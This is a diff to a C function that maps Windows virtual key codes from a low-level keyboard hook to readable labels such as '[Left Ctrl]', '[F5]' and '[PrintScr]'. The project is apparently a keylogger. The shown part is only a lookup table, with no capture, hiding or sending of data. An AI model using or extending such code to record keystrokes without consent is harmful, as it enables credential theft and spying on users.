@@ -33,26 +33,33 @@ void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent) {
 		//	- You may be vulnerable to buffer overflow (if you take user input as source)
 		//  - It will append a null (\0) terminator at the end of string
 		// So, no worries about buffer overflow since it's a constant what we are copying
-	case 0xA1:
-		strcpy(buffer, "[Right Shift]");
-		break;
-	case 0xA0:
-		strcpy(buffer, "[Left Shift]");
-		break;
 	case 0x8:
 		strcpy(buffer, "[Backspace]");
-		break;
-	case 0x1B:
-		strcpy(buffer, "[Esc]");
 		break;
 	case 0x9:
 		strcpy(buffer, "[Tab]");
 		break;
-	case 0x2E:
-		strcpy(buffer, "[Delete]");
+	case 0x14:
+		strcpy(buffer, "[CapsLock]");
 		break;
-	case 0xA4:
-		strcpy(buffer, "[Alt]");
+	case 0x1B:
+		strcpy(buffer, "[Esc]");
+		break;
+	
+	case 0x20:
+		strcpy(buffer, "[Space]");
+		break;
+	case 0x21:
+		strcpy(buffer, "[PageUp]");
+		break;
+	case 0x22:
+		strcpy(buffer, "[PageDown]");
+		break;
+	case 0x23:
+		strcpy(buffer, "[End]");
+		break;
+	case 0x24:
+		strcpy(buffer, "[Home]");
 		break;
 	case 0x25:
 		strcpy(buffer, "[Left]");
@@ -66,10 +73,87 @@ void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent) {
 	case 0x28:
 		strcpy(buffer, "[Down]");
 		break;
-	case 0xA2:
-	case 0xA3:
-		strcpy(buffer, "[Ctrl]");
+	case 0x2C:
+		strcpy(buffer, "[PrintScr]");
 		break;
+	case 0x2D:
+		strcpy(buffer, "[Ins]");
+		break;
+	case 0x2E:
+		strcpy(buffer, "[Supr]");
+		break;
+
+	case 0x5B:
+		strcpy(buffer, "[Left Win]");
+		break;
+	case 0x5C:
+		strcpy(buffer, "[Right Win]");
+		break;
+	case 0x5D:
+		strcpy(buffer, "[CtxMenu]");
+		break;
+
+	case 0x70:
+		strcpy(buffer, "[F1]");
+		break;
+	case 0x71:
+		strcpy(buffer, "[F2]");
+		break;
+	case 0x72:
+		strcpy(buffer, "[F3]");
+		break;
+	case 0x73:
+		strcpy(buffer, "[F4]");
+		break;
+	case 0x74:
+		strcpy(buffer, "[F5]");
+		break;
+	case 0x75:
+		strcpy(buffer, "[F6]");
+		break;
+	case 0x76:
+		strcpy(buffer, "[F7]");
+		break;
+	case 0x77:
+		strcpy(buffer, "[F8]");
+		break;
+	case 0x78:
+		strcpy(buffer, "[F9]");
+		break;
+	case 0x79:
+		strcpy(buffer, "[F10]");
+		break;
+	case 0x7A:
+		strcpy(buffer, "[F11]");
+		break;
+	case 0x7B:
+		strcpy(buffer, "[F12]");
+		break;
+
+	case 0x91:
+		strcpy(buffer, "[ScrollLock]");
+		break;
+
+	case 0xA0:
+		strcpy(buffer, "[Left Shift]");
+		break;
+	case 0xA1:
+		strcpy(buffer, "[Right Shift]");
+		break;
+		// Left and Right Ctrl
+	case 0xA2:
+		strcpy(buffer, "[Left Ctrl]");
+		break;
+	case 0xA3:
+		strcpy(buffer, "[Right Ctrl]");
+		break;
+	case 0xA4:
+		strcpy(buffer, "[Left Alt]");
+		break;
+	case 0xA5:
+		strcpy(buffer, "[Right Alt]");
+		break;
+
 	case 0xD:
 		strcpy(buffer, "[\\n]");
 		break;
